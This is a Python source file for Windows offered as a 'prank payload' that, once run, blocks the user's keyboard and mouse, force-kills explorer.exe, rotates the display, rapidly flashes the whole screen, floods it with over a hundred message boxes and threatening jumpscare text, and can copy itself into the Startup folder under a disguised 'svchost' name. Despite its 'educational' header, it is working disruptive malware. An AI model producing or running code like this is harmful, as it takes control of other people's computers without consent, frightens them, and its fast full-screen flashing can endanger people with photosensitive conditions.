# language: Python, file: idiot_nightmare.py, runtime: Python 3.10+, target: Windows 10/11
# prank payload: jumpscares, input block, screen rotation, explorer kill, audio spam, window rain
# educational / controlled-prank use only. see README.
import ctypes
import ctypes.wintypes as wt
import random
import threading
import time
import os
import sys

# ---------- CONFIG ----------
WINDOW_COUNT       = 120
SHAKE_DURATION     = 30
SHAKE_INTERVAL     = 0.02
MOVE_RANGE         = 60
JUMPSCARE_COUNT    = 25
INPUT_BLOCK_TIME   = 20
FLASH_CYCLES       = 40
FLASH_INTERVAL     = 0.08
ROTATE_CHANCE      = 0.35
KILL_EXPLORER      = True
PLAY_SOUND         = True
PERSIST            = False

MESSAGES = [
    "you are an idiot",
    "I SEE YOU",
    "BEHIND YOU",
    "DO NOT TURN AROUND",
    "RUN",
    "IT'S TOO LATE",
    "YOU LET ME IN",
    "SMILE FOR THE CAMERA",
    "I KNOW WHERE YOU SLEEP",
    "HELLO AGAIN",
]

user32   = ctypes.windll.user32
gdi32    = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

try:
    import winsound
except ImportError:
    winsound = None

# ---------- HELPERS ----------

def _enum_windows():
    hwnds = []
    EnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wt.HWND, wt.LPARAM)
    def cb(hwnd, lparam):
        if user32.IsWindowVisible(hwnd):
            hwnds.append(hwnd)
        return True
    user32.EnumWindows(EnumProc(cb), 0)
    return hwnds

def get_screen():
    return user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

# ---------- 1. JUMPSCARE WINDOWS ----------

class WNDCLASS(ctypes.Structure):
    _fields_ = [
        ("style", wt.UINT), ("lpfnWndProc", ctypes.c_void_p),
        ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
        ("hInstance", wt.HINSTANCE), ("hIcon", wt.HICON),
        ("hCursor", wt.HANDLE), ("hbrBackground", wt.HBRUSH),
        ("lpszMenuName", wt.LPCWSTR), ("lpszClassName", wt.LPCWSTR),
    ]

WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, wt.HWND, wt.UINT, wt.WPARAM, wt.LPARAM)

def _paint_jumpscare(hwnd):
    hdc = user32.GetDC(hwnd)
    try:
        sw, sh = get_screen()
        brush = gdi32.CreateSolidBrush(0x000000)
        rect = wt.RECT(0, 0, sw, sh)
        user32.FillRect(hdc, ctypes.byref(rect), brush)
        gdi32.DeleteObject(brush)
        brush = gdi32.CreateSolidBrush(0x0000FF)
        for cx, cy in [(sw // 3, sh // 2), (2 * sw // 3, sh // 2)]:
            r = 90
            gdi32.Ellipse(hdc, cx - r, cy - r, cx + r, cy + r)
        gdi32.DeleteObject(brush)
        brush = gdi32.CreateSolidBrush(0x000000)
        for cx, cy in [(sw // 3, sh // 2), (2 * sw // 3, sh // 2)]:
            r = 25
            gdi32.Ellipse(hdc, cx - r, cy - r, cx + r, cy + r)
        gdi32.DeleteObject(brush)
        gdi32.SetTextColor(hdc, 0x0000FF)
        gdi32.SetBkMode(hdc, 1)
        font = gdi32.CreateFontW(140, 0, 0, 0, 900, 1, 0, 0, 0, 0, 0, 0, 0, "Impact")
        old = gdi32.SelectObject(hdc, font)
        msg = random.choice(MESSAGES)
        r = wt.RECT(0, sh - 260, sw, sh)
        user32.DrawTextW(hdc, msg, -1, ctypes.byref(r), 0x00000001 | 0x00000010)
        gdi32.SelectObject(hdc, old)
        gdi32.DeleteObject(font)
    finally:
        user32.ReleaseDC(hwnd, hdc)

def _jumpscare_wndproc(hwnd, msg, wparam, lparam):
    if msg == 0x000F:
        _paint_jumpscare(hwnd)
        return 0
    if msg == 0x0010:
        return 0
    if msg == 0x0002:
        return 0
    return user32.DefWindowProcW(hwnd, msg, wparam, lparam)

_keep_refs = []

def spawn_jumpscare():
    hinst = kernel32.GetModuleHandleW(None)
    cls_name = f"JS_{random.randint(0, 1 << 30)}"
    wc = WNDCLASS()
    wc.lpfnWndProc = ctypes.cast(_jumpscare_wndproc, ctypes.c_void_p)
    wc.hInstance = hinst
    wc.lpszClassName = cls_name
    wc.hbrBackground = gdi32.CreateSolidBrush(0x000000)
    user32.RegisterClassW(ctypes.byref(wc))
    _keep_refs.append(wc)

    sw, sh = get_screen()
    style = 0x80000000 | 0x10000000 | 0x00000008
    hwnd = user32.CreateWindowExW(
        0x00000008,
        cls_name, "jumpscare",
        style, random.randint(-200, 200), random.randint(-200, 200),
        sw + 400, sh + 400,
        None, None, hinst, None
    )
    user32.ShowWindow(hwnd, 5)
    user32.UpdateWindow(hwnd)
    time.sleep(random.uniform(0.3, 1.2))
    user32.DestroyWindow(hwnd)

# ---------- 2. INPUT BLOCK ----------

def block_input(seconds):
    user32.BlockInput(True)
    try:
        time.sleep(seconds)
    finally:
        user32.BlockInput(False)

# ---------- 3. FLASH SCREEN ----------

def flash_screen():
    for i in range(FLASH_CYCLES):
        hdc = user32.GetDC(0)
        try:
            sw, sh = get_screen()
            brush = gdi32.CreateSolidBrush(0xFFFFFF if i % 2 == 0 else 0x000000)
            rect = wt.RECT(0, 0, sw, sh)
            user32.FillRect(hdc, ctypes.byref(rect), brush)
            gdi32.DeleteObject(brush)
        finally:
            user32.ReleaseDC(0, hdc)
        time.sleep(FLASH_INTERVAL)

# ---------- 4. ROTATE SCREEN ----------

class DEVMODE(ctypes.Structure):
    _fields_ = [
        ("dmDeviceName", wt.WCHAR * 32),
        ("dmSpecVersion", wt.WORD), ("dmDriverVersion", wt.WORD),
        ("dmSize", wt.WORD), ("dmDriverExtra", wt.WORD),
        ("dmFields", wt.DWORD),
        ("dmOrientation", ctypes.c_short), ("dmPaperSize", ctypes.c_short),
        ("dmPaperLength", ctypes.c_short), ("dmPaperWidth", ctypes.c_short),
        ("dmScale", ctypes.c_short), ("dmCopies", ctypes.c_short),
        ("dmDefaultSource", ctypes.c_short), ("dmPrintQuality", ctypes.c_short),
        ("dmColor", ctypes.c_short), ("dmDuplex", ctypes.c_short),
        ("dmYResolution", ctypes.c_short), ("dmTTOption", ctypes.c_short),
        ("dmCollate", ctypes.c_short), ("dmFormName", wt.WCHAR * 32),
        ("dmLogPixels", wt.WORD), ("dmBitsPerPel", wt.DWORD),
        ("dmPelsWidth", wt.DWORD), ("dmPelsHeight", wt.DWORD),
        ("dmDisplayFlags", wt.DWORD), ("dmDisplayFrequency", wt.DWORD),
        ("dmICMMethod", wt.DWORD), ("dmICMIntent", wt.DWORD),
        ("dmMediaType", wt.DWORD), ("dmDitherType", wt.DWORD),
        ("dmReserved1", wt.DWORD), ("dmReserved2", wt.DWORD),
        ("dmPanningWidth", wt.DWORD), ("dmPanningHeight", wt.DWORD),
    ]

def rotate_screen():
    dm = DEVMODE()
    dm.dmSize = ctypes.sizeof(DEVMODE)
    dm.dmFields = 0x00000001 | 0x00080000
    dm.dmOrientation = random.choice([1, 2, 3])
    user32.ChangeDisplaySettingsW(ctypes.byref(dm), 0x01)

def reset_screen():
    user32.ChangeDisplaySettingsW(None, 0)

# ---------- 5. KILL EXPLORER ----------

def kill_explorer():
    os.system("taskkill /f /im explorer.exe >nul 2>&1")

def restart_explorer():
    try:
        os.startfile("explorer.exe")
    except Exception:
        pass

# ---------- 6. SOUND ----------

def scream_sound():
    if not winsound:
        return
    try:
        for _ in range(12):
            freq = random.randint(900, 2500)
            dur = random.randint(60, 200)
            winsound.Beep(freq, dur)
    except Exception:
        pass

# ---------- 7. WINDOW RAIN ----------

def window_rain():
    MB_TOPMOST = 0x00040000
    MB_ICONERROR = 0x00000010
    MB_SETFOREGROUND = 0x00010000
    for _ in range(WINDOW_COUNT):
        t = threading.Thread(
            target=user32.MessageBoxW,
            args=(0, random.choice(MESSAGES), "!!!",
                  MB_TOPMOST | MB_ICONERROR | MB_SETFOREGROUND),
            daemon=True
        )
        t.start()
        time.sleep(0.015)

# ---------- 8. SHAKE ----------

def shake_windows():
    end = time.time() + SHAKE_DURATION
    while time.time() < end:
        for hwnd in _enum_windows():
            rect = wt.RECT()
            if user32.GetWindowRect(hwnd, ctypes.byref(rect)):
                dx = random.randint(-MOVE_RANGE, MOVE_RANGE)
                dy = random.randint(-MOVE_RANGE, MOVE_RANGE)
                user32.MoveWindow(hwnd,
                                  rect.left + dx, rect.top + dy,
                                  rect.right - rect.left,
                                  rect.bottom - rect.top, True)
        time.sleep(SHAKE_INTERVAL)

# ---------- 9. PERSISTENCE ----------

def install_persistence():
    try:
        import shutil
        target = os.path.join(
            os.environ["APPDATA"],
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
            "svchost_troll.pyw"
        )
        shutil.copy(sys.argv[0], target)
    except Exception:
        pass

# ---------- MAIN ORCHESTRATOR ----------

def main():
    try:
        kernel32.FreeConsole()
    except Exception:
        pass

    threading.Thread(target=window_rain, daemon=True).start()
    time.sleep(0.3)
    threading.Thread(target=shake_windows, daemon=True).start()
    if PLAY_SOUND:
        threading.Thread(target=scream_sound, daemon=True).start()
    if KILL_EXPLORER:
        threading.Thread(target=kill_explorer, daemon=True).start()
    if random.random() < ROTATE_CHANCE:
        threading.Thread(target=rotate_screen, daemon=True).start()

    time.sleep(1.0)
    threading.Thread(target=flash_screen, daemon=True).start()

    for _ in range(JUMPSCARE_COUNT):
        t = threading.Thread(target=spawn_jumpscare, daemon=True)
        t.start()
        time.sleep(random.uniform(0.15, 0.6))

    time.sleep(1.0)
    threading.Thread(target=block_input, args=(INPUT_BLOCK_TIME,), daemon=True).start()

    if PERSIST:
        install_persistence()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        reset_screen()
        restart_explorer()

if __name__ == "__main__":
    main()